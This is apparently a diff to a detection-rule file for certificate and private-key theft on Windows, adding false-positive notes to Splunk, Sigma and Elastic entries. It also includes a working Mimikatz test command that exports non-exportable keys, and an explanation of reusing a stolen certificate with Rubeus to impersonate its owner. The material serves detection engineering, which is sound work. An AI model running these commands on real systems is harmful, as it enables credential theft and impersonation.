@@ -144,7 +144,8 @@
           "T1552.004"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Security assessment tools performing authorized credential testing"
       },
       {
         "platform": "splunk",
@@ -159,7 +160,8 @@
         "confidence": "medium",
         "log_ids": [
           "70"
-        ]
+        ],
+        "false_positives": "Security assessment tools performing authorized credential testing"
       },
       {
         "platform": "splunk",
@@ -174,7 +176,8 @@
         "confidence": "medium",
         "log_ids": [
           "10"
-        ]
+        ],
+        "false_positives": "Security assessment tools performing authorized credential testing"
       },
       {
         "platform": "splunk",
@@ -189,7 +192,8 @@
         "confidence": "medium",
         "log_ids": [
           "4104"
-        ]
+        ],
+        "false_positives": "Security assessment tools performing authorized credential testing"
       },
       {
         "platform": "sigma",
@@ -201,7 +205,8 @@
           "T1552.004"
         ],
         "fidelity": "signature",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Security assessment tools performing authorized credential testing"
       },
       {
         "platform": "sigma",
@@ -213,7 +218,8 @@
           "T1552.004"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Security assessment tools performing authorized credential testing"
       },
       {
         "platform": "elastic",
@@ -224,7 +230,9 @@
           "T1649",
           "T1552.004"
         ],
-        "fidelity": "behavioral"
+        "fidelity": "behavioral",
+        "false_positives": "Security assessment tools performing authorized credential testing",
+        "confidence": "high"
       }
     ],
     "visibility": {
@@ -273,7 +281,8 @@
         "Check for credential dumping artifacts (LSASS access, SAM hive reads, Kerberos anomalies)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "Invoke-Mimikatz -Command '\"crypto::capi\" \"crypto::cng\" \"crypto::certificates /export\"'"
     }
   },
   "explain": "Exports certificates AND their private keys from the Windows stores, even keys marked non-exportable:\n  crypto::capi              patch CryptoAPI in memory so CAPI-backed keys become exportable\n  crypto::cng               patch the KeyIso/CNG service so CNG keys become exportable\n  crypto::certificates /export   dump certs+keys from the current-user store (add /systemstore:...LOCAL_MACHINE for the machine store)\nYou get .pfx files; use a client-auth cert with Rubeus asktgt /certificate to PKINIT as its owner."
